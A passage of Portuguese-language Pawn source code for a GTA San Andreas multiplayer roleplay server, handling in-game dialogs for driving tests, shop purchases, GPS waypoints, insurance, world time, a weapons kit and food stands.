			Checks6[playerid] = 0;
            InAutoEscola3[playerid] = 1;
            new rand = random(sizeof(STruck));
            carroauto3[playerid] = CreateVehicle(403, STruck[rand][0], STruck[rand][1], STruck[rand][2], STruck[rand][3],0,0, -1);
            SetPlayerInterior(playerid, 0);
            pInfo[playerid][EntrouL] = false;
            PutPlayerInVehicle(playerid, carroauto3[playerid], 0);
            SendClientMessage(playerid,COR_AMARELO,"Tente não danificar o caminhão para não ser reprovado!");
            SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[0][0], AutoPoints3[0][1], AutoPoints3[0][2],AutoPoints3[1][0], AutoPoints3[1][1], AutoPoints3[1][2], 7);
            Checks3[playerid] = 1;
            GivePlayerCash(playerid, -2000);
            return 1;
        }
        if(response == 0)
        {
            SendClientMessage(playerid,COR_ERRO,"Voce desistiu do teste, por tanto foi reprovado.");
            return 1;
        }
    }
	if(dialogid == D_AUTOESCOLABARCO)
    {
        if(response == 1)
        {
			Checks[playerid] = 0;
			Checks2[playerid] = 0;
			Checks3[playerid] = 0;
			Checks4[playerid] = 0;
			Checks5[playerid] = 0;
			Checks6[playerid] = 0;
            InAutoEscola4[playerid] = 1;
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            carroauto4[playerid] = CreateVehicle(473, 2293.1831,-2428.9436,-0.5376,164.5155,0,0, -1);
            SetPlayerInterior(playerid, 0);
            pInfo[playerid][EntrouL] = false;
            PutPlayerInVehicle(playerid, carroauto4[playerid], 0);
            SendClientMessage(playerid,COR_AMARELO,"Tente não danificar o barco para não ser reprovado!");
            SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[0][0], AutoPoints4[0][1], AutoPoints4[0][2],AutoPoints4[1][0], AutoPoints4[1][1], AutoPoints4[1][2], 7);
            Checks4[playerid] = 1;
            GivePlayerCash(playerid, -7000);
            return 1;
        }
        if(response == 0)
        {
            SendClientMessage(playerid,COR_ERRO,"Voce desistiu do teste, por tanto foi reprovado.");
            return 1;
        }
    }
	if(dialogid == D_AUTOESCOLAAVIAO)
    {
        if(response == 1)
        {
			Checks[playerid] = 0;
			Checks2[playerid] = 0;
			Checks3[playerid] = 0;
			Checks4[playerid] = 0;
			Checks5[playerid] = 0;
			Checks6[playerid] = 0;
            InAutoEscola5[playerid] = 1;
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            carroauto5[playerid] = CreateVehicle(511, -1524.6490,-137.3293,15.5220,335.2565,0,0, -1);
            SetPlayerInterior(playerid, 0);
            pInfo[playerid][EntrouL] = false;
            PutPlayerInVehicle(playerid, carroauto5[playerid], 0);
            SendClientMessage(playerid,COR_AMARELO,"Tente não danificar o avião para não ser reprovado!");
            SendClientMessage(playerid,COR_AMARELO,"Pilote até o aeroporto de Los Santos para concluir o teste!");
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints5[0][0], AutoPoints5[0][1], AutoPoints5[0][2],AutoPoints5[1][0], AutoPoints5[1][1], AutoPoints5[1][2], 10);
            Checks5[playerid] = 1;
            GivePlayerCash(playerid, -30000);
            return 1;
        }
        if(response == 0)
        {
            SendClientMessage(playerid,COR_ERRO,"Voce desistiu do teste, por tanto foi reprovado.");
            return 1;
        }
    }
	if(dialogid == D_AUTOESCOLAHELI)
    {
        if(response == 1)
        {
			Checks[playerid] = 0;
			Checks2[playerid] = 0;
			Checks3[playerid] = 0;
			Checks4[playerid] = 0;
			Checks5[playerid] = 0;
			Checks6[playerid] = 0;
            InAutoEscola6[playerid] = 1;
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            carroauto6[playerid] = CreateVehicle(469, 1545.1505,-1352.9768,329.4881,91.1948,0,0, -1);
            SetPlayerInterior(playerid, 0);
            pInfo[playerid][EntrouL] = false;
            PutPlayerInVehicle(playerid, carroauto6[playerid], 0);
            SendClientMessage(playerid,COR_AMARELO,"Tente não danificar o helicóptero para não ser reprovado!");
            SendClientMessage(playerid,COR_AMARELO,"Siga o quadrado vermelho em seu mapa para concluir o teste!");
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints6[0][0], AutoPoints6[0][1], AutoPoints6[0][2],AutoPoints6[1][0], AutoPoints6[1][1], AutoPoints6[1][2], 10);
            Checks6[playerid] = 1;
            GivePlayerCash(playerid, -15000);
            return 1;
        }
        if(response == 0)
        {
            SendClientMessage(playerid,COR_ERRO,"Voce desistiu do teste, por tanto foi reprovado.");
            return 1;
        }
    }
	if(dialogid == D_UTILI)
	{
        if(response)
        {
	        switch(listitem)
	        {
				case 0: // 'Celular'
	            {
	                if(pInfo[playerid][Celular] == 1)
					{
					    SendClientMessage(playerid, COR_ERRO, "Você já tem celular!");
					    return 1;
					}
					if(GetPlayerCash(playerid) < 5000)
		         	{
		         	    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente!");
		         	    SendClientMessage(playerid, COR_ERRO, "Um celular custa R$5000!");
						return 1;
					}
					sGivePlayerCash(playerid, -5000);
					WE_SetInt(f(playerid), "Celular", 1);
					pInfo[playerid][Celular] = 1;
		       		SendClientMessage(playerid, COR_AMARELO, "Celular adquirido!");
		       		SendClientMessage(playerid, COR_AMARELO, "Para visualizar os comandos digite: {FFFFFF}/Celular");
					return 1;
	            }
	 			case 1: // 'Créditos'
	            {
	                if(pInfo[playerid][Celular_c] >= 100)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Seu celular já tem 100 SMS de créditos!");
	                    SendClientMessage(playerid, COR_ERRO, "Você só pode carregar o celular quanto estiver com menos de (100 SMS)!");
	                    return 1;
	                }
	                new
						add_creditos = (100 - pInfo[playerid][Celular_c])
					;
					new
					    preco_creditos = (add_creditos * 10)
					;
					if(GetPlayerCash(playerid) < preco_creditos)
		          	{
		          	    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente!");
		          	    if(add_creditos > 0)
		          	    {
			          	    format(gStr, 128, "Você precisa ter em mãos R$%d para carregar seu celular!", preco_creditos);
			          	    SendClientMessage(playerid, COR_ERRO, gStr);
		          	    }
		          	    else
		          	    {
			          	    SendClientMessage(playerid, COR_ERRO, "Você precisa ter em mãos R$1000 para carregar seu celular!");
		          	    }
		          	    return 1;
		          	}
		          	sGivePlayerCash(playerid, -preco_creditos);

		       		SendClientMessage(playerid, COR_AMARELO, "Celular carregado!");

		       		format(gStr, 128, "Crédito anterior %d SMS, crédito atual (100 SMS), total gasto {FFFFFF}R$%d.", pInfo[playerid][Celular_c], preco_creditos);
		       		SendClientMessage(playerid, COR_AMARELO, gStr);

		       		pInfo[playerid][Celular_c] = 100;

					return 1;
	            }
	            case 2: // 'Capacete'
	            {
	                if(pInfo[playerid][Tem_Capacete] == 0)
	                {
						if(GetPlayerCash(playerid) >= 2000)
			        	{
			        	    SendClientMessage(playerid, COR_AMARELO, "Capacete adquirido com sucesso ! Para ver os comandos digite: /Capacete");
			        	    pInfo[playerid][Tem_Capacete] = 1;
			        	    WE_SetInt(gFile, "Tem_Capact", 1);
			        	    sGivePlayerCash(playerid, -2000);
			        	}
						else
						{
							SendClientMessage(playerid, COR_ERRO, "Você precisa ter R$2000 para comprar o capacete!");
						}
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COR_ERRO, "Você já tem um capacete!");
					}
					return 1;
	            }
	            case 3: // 'GPS Player'
	            {
	                if(WE_GetInt(gFile, "GPSPlayer") == 0)
	                {
						if(GetPlayerCash(playerid) >= 15000)
			        	{
			        	    SendClientMessage(playerid, COR_AMARELO, "GPSPlayer adquirido com sucesso! Para usá-lo, digite: /Localizar");
			        	    WE_SetInt(gFile, "GPSPlayer", 1);
			        	    sGivePlayerCash(playerid, -15000);
			        	}
						else
						{
						    SendClientMessage(playerid, COR_ERRO, "Você precisa ter R$15000 para comprar o GPSPlayer!");
						}
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COR_ERRO, "Você já tem um GPSPlayer!");
					}
					return 1;
	            }
	        }
		}
		return 1;
	}
	if(dialogid == D_GPSL1)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
					ShowPlayerDialog(playerid, D_GPSLS, DIALOG_STYLE_LIST, "GPS - Locais de Los Santos", "Agência de Empregos\nBanco\nPrefeitura\nDelegacia\nLoja de Utilitários\nBinco\nGinásio de Luta\nCruzeiro de LS\nCentro de Eventos/Shows\nAuto Escola\nPosto de Combustível\nLoteria\nTransfender\nTransfender Low-rider\nOficina de Tunning WE\nHotel\nQuadra de Basquete", "Localizar", "Voltar");
	            }
	            case 1:
	            {
					ShowPlayerDialog(playerid, D_GPSSF, DIALOG_STYLE_LIST, "GPS - Locais de San Fierro", "{FF1E1E}Menu ainda não desenvolvido, aguarde.", "Localizar", "Voltar");
	            }
	            case 2:
	            {
					ShowPlayerDialog(playerid, D_GPSLV, DIALOG_STYLE_LIST, "GPS - Locais de Las Veturas", "{FF1E1E}Menu ainda não desenvolvido, aguarde.", "Localizar", "Voltar");
	            }
	            case 3:
	            {
	             	RemovePlayerMapIcon(playerid, 90);
	          		SendClientMessage(playerid, VERMELHO_WE, "O seu GPS foi desabilitado.");
	            }
	        }
		}
		return 1;
	}
	if(dialogid == D_GPSLS)
	{
	    if(!response)
	    {
			ShowPlayerDialog(playerid, D_GPSL1, DIALOG_STYLE_LIST, "GPS - Escolha a cidade", "Los Santos\nSan Fierro\nLas Venturas\n{FF0000}Desligar GPS", "Abrir", "Sair");
		}
	    if(response)
	    {
	        switch(listitem)
	        {
				case 0:
	            {
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Agência de Los Santos localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
		    		SetPlayerMapIcon(playerid, 90, 1310.3708,-1370.8752,13.5204, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 1:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Banco de Los Santos localizado.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 1778.3708,-1721.8687,13.4134, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 2:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Prefeitura de Los Santos localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 1481.0233,-1771.7765,18.7957, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
				case 3:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Delegacia de Los Santos localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 1543.9362, -1676.0367, 13.5574, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
				case 4:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Loja de Utilitários de Los Santos localizado.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 1169.7283, -1489.6672, 22.7560, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 5:
             	{
	               	RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Binco de Los Santos localizado.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 2244.6948, -1662.8044, 15.4766, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	         	case 6:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Ginásio de Luta de Los Santos localizado.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 2225.9150, -1724.6503, 13.5587, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 7:
            	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Cruzeiro & Clube marítimo de Los Santos localizado.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 646.0756, -2244.9697, 43.5413, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 8:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Centro de Eventos de Fort Carson localizado.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, -280.0119, 1530.6389, 77.9008, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 9:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Auto Escola de Los Santos localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 1643.6836, -1345.7307, 17.4464, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 10:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Posto de Combustível de Los Santos localizado.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 1940.4883,-1772.6022,13.3906, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 11:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Loteria de Los Santos localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 1631.8190,-1172.7080,24.0843, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 12:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Transfender de Los Santos localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 1041.1962,-1030.2954,32.0833, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
             	case 13:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Transfender Low-rider Los Santos localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 2644.7849,-2020.3087,13.5469, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 14:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Oficina de Tunning WE Los Santos localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 1708.7620,-1793.4124,14.6142, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 15:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Hotel Los Santos localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 332.1207,-1515.8090,35.8672, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 16:
             	{
	                RemovePlayerMapIcon(playerid, 90);
	                SendClientMessage(playerid, AZUL_WE, "Quadra de basquete localizada.");
		    		SendClientMessage(playerid, VERMELHO_WE, "Vá em direção ao ícone da {1E90FF}Bandeira Quadriculada {FF1E1E}criada em seu {1E90FF}mapa{FF1E1E}.");
	                SetPlayerMapIcon(playerid, 90, 2782.3127,-2019.6082,13.5547, 53,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
			}
	    }
	}
	if(dialogid == D_HOSPI)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(GetPlayerCash(playerid) < 5000)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem R$5.000, para aquisição de umConvênio Médico!");
	                    TogglePlayerControllable(playerid, true);
	                    return 1;
					}
					if(WE_GetInt(gFile, "Convenio") == 1)
					{
					    SendClientMessage(playerid, COR_ERRO, "Você já possui um Convênio Médico!");
					    return 1;
					}
					else if(WE_GetInt(gFile, "Convenio") == 0)
					{
		                SendClientMessage(playerid, AZUL_WE, "Parabéns, você adquiriu um Convênio Médico.");
		                WE_SetInt(gFile, "Convenio", 1);
						sGivePlayerCash(playerid,  -5000);
		                return 1;
					}
	            }
			 	case 1:
				{
	                if(GetPlayerCash(playerid) < 10000)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem R$5.000, para contratar o Seguro de Acidentes!");
	                    return 1;
					}
					if(WE_GetInt(gFile, "Seguro") == 1)
					{
					    SendClientMessage(playerid, COR_ERRO, "Você já possui um contrato com o Seguro de Acidentes!");
					    return 1;
					}
					else if(WE_GetInt(gFile, "Seguro") == 0)
					{
		                SendClientMessage(playerid, AZUL_WE, "Parabéns você contratou o Seguro de Acidentes.");
		                WE_SetInt(gFile, "Seguro", 1);
						sGivePlayerCash(playerid,  -10000);
		                return 1;
					}
	            }
	        }
		}
		return 1;
	}
	if(dialogid == D_TEMPO)
	{
        if(response)
        {
	        switch(listitem)
	        {
        	   	case 0:
		        {
			        SetWorldTime(8);
			        return 1;
				}
		        case 1:
				{
					SetWorldTime(16);
					return 1;
				}
		        case 2:
		        {
	   		        SetWorldTime(20);
	   		        return 1;
				}
		        case 3:
				{
	                SetWorldTime(0);
	                return 1;
				}
	        }
		}
		return 1;
	}
	if(dialogid == D_FAVEL)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	            	if(pInfo[playerid][Tem_Kit] == 1)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você já possui o conjunto de armas!");
	                    return 1;
					}
	                if(GetPlayerCash(playerid) >= 27500)
	                {
			            SendClientMessage(playerid, COR_AMARELO, "Você comprou o conjunto de armas!");
						pInfo[playerid][Tem_Kit] = 1;
						ResetPlayerWeapons(playerid);
				  		GivePlayerWeapon(playerid, 24, 99999); // Eagle
				  		GivePlayerWeapon(playerid, 26, 99999); // Sawn-off
				  		GivePlayerWeapon(playerid, 32, 99999); // Tec-9
				  		GivePlayerWeapon(playerid, 34, 99999); // Sniper
				  		GivePlayerWeapon(playerid, 31, 99999); // M4
				  		GivePlayerWeapon(playerid, 9, 1); // Serra
	                	sGivePlayerCash(playerid,  -27500);
	                	PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                	return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem R$27.000, para comprar o Kit!");
					    return 1;
					}
	            }
	            case 1:
	            {
	                PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                SendClientMessage(playerid, COR_AMARELO, "Kit removido com sucesso!");
		            pInfo[playerid][Tem_Kit] = 0;
		            return 1;
	            }
	        }
		}
		return 1;
	}
	new
		Float:pVida
	;
	GetPlayerHealth(playerid, pVida);
	if(dialogid == D_HTDOG)
	{
        if(response)
        {
	        switch(listitem)
	        {
        		case 0:
	            {
	             	if(GetPlayerCash(playerid) < 20)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$20)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 10.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog simples!");
	                    sGivePlayerCash(playerid, - 20);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog simples!");
	                sGivePlayerCash(playerid, - 20);
					SetPlayerHealth(playerid, pVida + 10.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 1:
	            {
	             	if(GetPlayerCash(playerid) < 30)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$30)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 20.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog 2 Salsichas!");
	                    sGivePlayerCash(playerid, - 30);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog 2 Salsichas!");
	                sGivePlayerCash(playerid, - 30);
					SetPlayerHealth(playerid, pVida + 20.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 2:
	            {
	             	if(GetPlayerCash(playerid) < 40)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$40)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 30.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog 2 Salsichas + Molho especial!");
	                    sGivePlayerCash(playerid, - 40);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog 2 Salsichas + Molho especial!");
	                sGivePlayerCash(playerid, - 40);
					SetPlayerHealth(playerid, pVida + 30.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 3:
	            {
	             	if(GetPlayerCash(playerid) < 60)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$60)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 40.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog 4 Salsichas!");
	                    sGivePlayerCash(playerid, - 60);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog 4 Salsichas!");
	                sGivePlayerCash(playerid, - 60);
					SetPlayerHealth(playerid, pVida + 40.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 4:
	            {
	             	if(GetPlayerCash(playerid) < 80)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$80)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 50.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog 4 Salsichas + Molho especial!");
	                    sGivePlayerCash(playerid, - 80);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog 4 Salsichas + Molho especial!");
	                sGivePlayerCash(playerid, - 80);
					SetPlayerHealth(playerid, pVida + 50.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 5:
	            {
	             	if(GetPlayerCash(playerid) < 100)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$100)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 60.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog COMPLETO!");
	                    sGivePlayerCash(playerid, - 100);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um hot dog COMPLETO!");
	                sGivePlayerCash(playerid, - 100);
					SetPlayerHealth(playerid, pVida + 60.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
			}
		}
	}
	if(dialogid == D_SORVE)
	{
        if(response)
        {
	        switch(listitem)
	        {
        		case 0:
	            {
	             	if(GetPlayerCash(playerid) < 40)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$ 40)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 30.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um sorverte de massa sabor chocolate!");
	                    sGivePlayerCash(playerid, - 40);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um sorverte de massa sabor chocolate!");
	                sGivePlayerCash(playerid, - 40);
					SetPlayerHealth(playerid, pVida + 30.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 1:
	            {
	             	if(GetPlayerCash(playerid) < 40)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$ 40)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 30.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um sorverte de massa sabor morango!");
	                    sGivePlayerCash(playerid, - 40);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um sorverte de massa sabor morango!");
	                sGivePlayerCash(playerid, - 40);
					SetPlayerHealth(playerid, pVida + 30.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 2:
	            {
	             	if(GetPlayerCash(playerid) < 40)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$ 40)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 30.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um sorverte de massa sabor creme!");
	                    sGivePlayerCash(playerid, - 40);
	                    SetPlayerHealth(playerid, 100.0);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um sorverte de massa sabor creme!");
